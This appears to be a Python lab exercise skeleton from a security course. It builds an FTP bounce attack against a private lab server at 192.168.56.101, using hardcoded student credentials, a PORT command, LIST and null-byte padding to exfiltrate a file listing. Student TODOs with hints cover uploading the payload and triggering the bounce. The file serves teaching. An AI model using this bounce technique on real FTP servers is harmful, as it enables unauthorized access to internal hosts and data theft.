import sys, os
sys.path.append(os.path.dirname(os.path.abspath(__file__)) + "/..")
from cp_ftp import FTP

ftp = FTP("192.168.56.101", debug=True)
ftp.send_login_commands("student", "golyeeHug6")

################################################################################
# Build a script to get a LIST of files on the private server.
################################################################################

# 1. Commands to log in.
login_commands = ftp.get_login_commands("student", "golyeeHug6")

# 2. A PORT command for how to get data back to this script from the private server.
exfiltration_data_address = ftp.new_data_address()
port_command = ftp.get_port_command(exfiltration_data_address)

# 3. Build up the list of commands.
exploit_commands = []
exploit_commands.append(login_commands)
exploit_commands.append(port_command)
exploit_commands.append("LIST")
exploit_commands.append("QUIT")

# 4. Put the commands together. Pad with 1M nullbytes to ensure socket stays open long enough.
exploit_file = "exploit.txt"
file_contents = "\r\n".join(exploit_commands) + "\0" * 1000000

################################################################################
# STUDENT TODO 1: Upload the script to the server.
# Hint: the provided examples/stor.py will be useful.
################################################################################

################################################################################
# STUDENT TODO 2: Have the server send the script to the private server.
# Hint: the provided examples/remote_port.py will be useful.
# Hint: unlike in that example, we *are* recieving data inbetween the two data
#       transfer status responses.
# Hint: you need to get data from the same port as exfiltration_data_address.
#       ftp.new_data_address(port=exfiltration_data_address[1])
#       print("EXFILTRATED DATA: %s" % ftp.recv_data())
################################################################################

ftp.close()
